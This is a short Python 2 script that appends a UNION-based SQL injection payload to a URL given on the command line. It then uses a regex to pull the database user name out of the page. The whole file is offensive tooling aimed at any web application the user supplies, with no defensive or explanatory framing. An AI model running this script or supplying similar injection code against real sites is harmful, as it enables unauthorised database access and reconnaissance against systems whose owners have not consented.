#!/usr/bin/python

import requests
import sys
import re

url = sys.argv[1]

def detect_user(url):
  new_url = url + str("\'%20union%20select%201,concat('TOK', user(),'TOK')")
  req = requests.get(new_url)
  raw = req.content
  reg = ur"TOK([a-zA-Z0-9].+?)TOK+?"
  users = re.findall(reg, req.content)
  for user in users:
    print user

detect_user(url)
